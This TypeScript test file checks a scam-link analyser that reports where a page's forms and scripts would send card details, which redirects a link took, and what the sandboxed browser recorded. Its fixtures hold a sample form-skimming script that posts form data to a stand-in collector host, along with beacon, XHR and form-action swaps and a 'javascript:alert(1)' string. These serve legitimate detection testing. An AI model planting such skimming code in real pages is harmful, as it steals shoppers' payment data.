import { describe, expect, it } from "vitest";
import { createHash } from "node:crypto";
import { buildProof, mergeProof, moneyTrail, phoneTrail, scriptSendTargets, type Proof, type TelemetryItem } from "./trail";

const ev = (type: string, category: string, data: Record<string, unknown> = {}): TelemetryItem => ({ event: { type, category, data } });

describe("scriptSendTargets", () => {
  it("finds where a page's scripts would send data: fetch, sendBeacon, XHR open and form action changes", () => {
    const js = `
      form.addEventListener("x", function (e) { e.preventDefault(); fetch("https://collect-x.example/c", { method: "POST", body: new FormData(form) }); });
      navigator.sendBeacon('https://beacon.example/b');
      var x = new XMLHttpRequest(); x.open("POST", "https://xhr.example/p");
      form.action = "https://swap.example/take";
      fetch('/api/pay');
      var harmless = "https://cdn.example/logo.png";
    `;
    expect(scriptSendTargets(js, "https://parcels.example/track")).toEqual([
      "https://collect-x.example/c",
      "https://beacon.example/b",
      "https://xhr.example/p",
      "https://swap.example/take",
      "https://parcels.example/api/pay",
    ]);
  });
  it("ignores anything that isn't an http or https address", () => {
    expect(scriptSendTargets(`fetch("javascript:alert(1)"); fetch("data:text/plain,x")`, "https://a.example/")).toEqual([]);
  });
});

describe("moneyTrail", () => {
  const base = { startUrl: "https://bit.example/r/9", finalUrl: "https://parcels.example/track/A1" };

  it("flags a card form that would post to a domain that isn't the shop's own", () => {
    const t = moneyTrail({ ...base, forms: [{ action: "https://collect-x.example/pay", money: true }], scriptTargets: [], items: [] });
    expect(t.shop).toBe("parcels.example");
    expect(t.offsite).toEqual({ host: "collect-x.example", how: "form" });
    expect(t.line).toBe("Card details on this page would go to collect-x.example, not to the shop (parcels.example).");
  });

  it("counts script targets only when the page has a card or bank form", () => {
    expect(moneyTrail({ ...base, forms: [], scriptTargets: ["https://collect-x.example/c"], items: [] }).offsite).toBeNull();
    const t = moneyTrail({ ...base, forms: [{ action: "https://parcels.example/track/A1", money: true }], scriptTargets: ["https://collect-x.example/c"], items: [] });
    expect(t.offsite).toEqual({ host: "collect-x.example", how: "script" });
  });

  it("is quiet when the card form posts to the shop itself, subdomains included", () => {
    const t = moneyTrail({ ...base, forms: [{ action: "https://pay.parcels.example/go", money: true }], scriptTargets: [], items: [] });
    expect(t.offsite).toBeNull();
    expect(t.line).toBe("Card details on this page would go to the shop's own site (parcels.example).");
  });

  it("names each hop of the redirect chain from the browser's own network log", () => {
    const items = [
      ev("network_request", "network", { resource_type: "Document", target_type: "page", url: "https://bit.example/r/9" }),
      ev("network_request", "network", { resource_type: "Document", target_type: "page", url: "https://hop.example/x", is_redirect: true, redirect_url: "https://bit.example/r/9" }),
      ev("network_request", "network", { resource_type: "Document", target_type: "page", url: "https://parcels.example/track/A1", is_redirect: true, redirect_url: "https://hop.example/x" }),
      ev("network_request", "network", { resource_type: "Document", target_type: "iframe", url: "https://ads.example/frame" }),
    ];
    const t = moneyTrail({ ...base, forms: [], scriptTargets: [], items });
    expect(t.steps).toEqual([
      { host: "bit.example", how: "link" },
      { host: "hop.example", how: "redirect" },
      { host: "parcels.example", how: "landed" },
    ]);
    expect(t.stepsFrom).toBe("network log");
  });

  it("without a network log, says only where it started and landed", () => {
    const t = moneyTrail({ ...base, forms: [], scriptTargets: [], items: null });
    expect(t.steps).toEqual([
      { host: "bit.example", how: "link" },
      { host: "parcels.example", how: "landed" },
    ]);
    expect(t.stepsFrom).toBe("start and end only");
  });
});

describe("mergeProof and phoneTrail (two faces)", () => {
  const p = (over: Partial<Proof>): Proof => ({ clicks: 0, keys: 0, scrolls: 0, downloadsBlocked: true, apiCalls: 5, hashes: { screenshot: "a".repeat(64), text: "b".repeat(64) }, deleted: true, ...over });

  it("adds both visits up, and one unrecorded count makes the total unrecorded", () => {
    const m = mergeProof(p({}), p({ keys: null, apiCalls: 4, hashes: { screenshot: "c".repeat(64) } }));
    expect(m).toMatchObject({ clicks: 0, keys: null, scrolls: 0, downloadsBlocked: true, apiCalls: 9, deleted: true });
    expect(m.hashes).toEqual({ screenshot: "a".repeat(64), text: "b".repeat(64), phoneScreenshot: "c".repeat(64) });
  });

  it("only says downloads were blocked and browsers deleted when both visits confirm it", () => {
    expect(mergeProof(p({}), p({ downloadsBlocked: null })).downloadsBlocked).toBeNull();
    expect(mergeProof(p({}), p({ downloadsBlocked: false })).downloadsBlocked).toBe(false);
    expect(mergeProof(p({}), p({ deleted: false })).deleted).toBe(false);
    expect(mergeProof(p({}), p({ deleted: undefined })).deleted).toBeUndefined();
  });

  it("uses the phone's money trail when only the phone was shown the card form, and says so", () => {
    const desk = moneyTrail({ startUrl: "https://parcels.example/t", finalUrl: "https://parcels.example/t", forms: [], scriptTargets: [], items: null });
    const phone = moneyTrail({ startUrl: "https://parcels.example/t", finalUrl: "https://parcels.example/t", forms: [{ action: "https://collect-x.example/pay", money: true }], scriptTargets: [], items: null });
    const t = phoneTrail(desk, phone);
    expect(t.offsite).toEqual({ host: "collect-x.example", how: "form" });
    expect(t.line).toBe("On the phone version, card details would go to collect-x.example, not to the shop (parcels.example).");
    expect(phoneTrail(phone, desk)).toBe(phone);
  });
});

describe("buildProof", () => {
  const shot = `data:image/jpeg;base64,${Buffer.from("jpeg bytes").toString("base64")}`;
  const allOn = { interaction: true, control: true, network: true, page: true };

  it("counts clicks, keys and scrolls from KERNEL's telemetry and hashes what Spotter stored", () => {
    const p = buildProof({
      telemetry: { enabled: allOn, items: [ev("cdp_command", "control", { method: "Page.navigate" }), ev("api_call", "control", { operation_id: "ExecutePlaywrightCode" })] },
      policyEcho: { DownloadRestrictions: 3 },
      apiCalls: 6,
      screenshot: shot,
      pageText: "Parcel tracking",
    });
    expect(p).toMatchObject({ clicks: 0, keys: 0, scrolls: 0, downloadsBlocked: true, apiCalls: 6 });
    expect(p.hashes.screenshot).toBe(createHash("sha256").update(Buffer.from("jpeg bytes")).digest("hex"));
    expect(p.hashes.text).toBe(createHash("sha256").update("Parcel tracking", "utf8").digest("hex"));
  });

  it("counts typing Spotter's own automation would do too, not only what the page saw (password fields hide keys from the page log)", () => {
    const p = buildProof({
      telemetry: { enabled: allOn, items: [ev("cdp_command", "control", { method: "Input.insertText" }), ev("interaction_click", "interaction"), ev("cdp_command", "control", { method: "Input.dispatchMouseEvent", event_type: "mousePressed" })] },
      policyEcho: { DownloadRestrictions: 3 },
      apiCalls: 1,
    });
    expect(p.keys).toBe(1);
    expect(p.clicks).toBe(2);
  });

  it("says 'not recorded' (null), never zero, when telemetry wasn't on, wasn't confirmed or couldn't be read", () => {
    for (const telemetry of [null, { enabled: null, items: [] }, { enabled: { ...allOn, interaction: false }, items: [] }, { enabled: allOn, items: null }]) {
      const p = buildProof({ telemetry, policyEcho: { DownloadRestrictions: 3 }, apiCalls: 3 });
      expect(p.clicks).toBeNull();
      expect(p.scrolls).toBeNull();
    }
    // Control off: the page log still counts, but Spotter's own typing can't be ruled out, so keys aren't claimed.
    const noControl = buildProof({ telemetry: { enabled: { ...allOn, control: false }, items: [] }, policyEcho: null, apiCalls: 3 });
    expect(noControl.keys).toBeNull();
  });

  it("only says downloads were blocked when KERNEL echoed the block back", () => {
    expect(buildProof({ telemetry: null, policyEcho: null, apiCalls: 1 }).downloadsBlocked).toBeNull();
    expect(buildProof({ telemetry: null, policyEcho: { DownloadRestrictions: 0 }, apiCalls: 1 }).downloadsBlocked).toBe(false);
    expect(buildProof({ telemetry: null, policyEcho: { DownloadRestrictions: "3" }, apiCalls: 1 }).downloadsBlocked).toBe(false);
  });

  it("hashes nothing it wasn't given and never hashes a screenshot that isn't our JPEG", () => {
    const p = buildProof({ telemetry: null, policyEcho: null, apiCalls: 1, screenshot: "https://evil.example/x.jpg" });
    expect(p.hashes).toEqual({});
  });
});
